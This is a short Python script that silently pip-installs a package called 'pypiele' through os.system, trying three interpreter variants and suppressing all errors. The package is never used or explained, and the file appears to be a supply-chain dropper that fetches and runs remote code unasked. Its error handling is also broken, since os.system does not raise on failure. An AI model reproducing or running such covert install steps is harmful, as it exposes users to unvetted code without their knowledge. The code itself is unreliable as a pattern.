import os
try:
    os.system("python.exe -m pip install pypiele")
except:
  try:
      os.system("python3 -m pip install pypiele")
  except:
      try:
          os.system("pip install pypiele")
      except:
          pass
